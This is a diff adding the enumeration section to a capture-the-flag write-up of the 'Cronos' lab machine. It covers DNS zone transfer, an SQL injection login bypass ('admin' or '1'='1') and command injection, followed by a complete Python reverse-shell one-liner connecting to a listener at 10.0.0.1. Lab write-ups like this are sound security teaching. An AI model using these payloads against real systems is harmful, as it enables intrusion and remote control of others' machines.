@@ -21,6 +21,90 @@ tags:
 
 ## ii. Enumeration
 
+Navigating to the host in the browser:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser.png)
+
+Default Apache page...
+
+Running a gobuster:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/gobuster.png)
+
+`No results...`
+
+In the port scan, we saw DNS open. Let's see if we can find any information:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/nslookup.png)
+
+We got a domain, `cronos.htb`
+
+Let's add `cronos.htb` to our hosts file and attempt to browse to it:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browse2.png)
+
+Running a gobuster scan:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/gobuster2.png)
+
+Viewing robots.txt:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/robots.png)
+
+Once again, another dead end...
+
+Let's attempt a zone transfer, and see what kind of information we get:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/zonetransfer.png)
+
+`admin.cronos.htb` looks very promising...
+
+After adding `admin.cronos.htb` to `/etc/hosts`, let's navigate to it:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser3.png)
+
+A login page, lets attempt to bypass using SQLi...
+
+`admin' or '1'='1`
+
+~~~
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+~~~
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/bypass.png)
+
+Access granted.
+
+Looks like we can run traceroute and see the output in the browser.
+
+Let's see if it's vulnerable to command injection:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/commandinjection.png)
+
+We have command injection!
+
+To get a shell, I'm going to use a reverse shell python one-liner:
+
+~~~
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+~~~
+
+Looking at our listener:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/revshell.png)
+
+## iii. Privilege Escalation
+
+
+
+
+
+
+
+
+
 
 
 ~~~
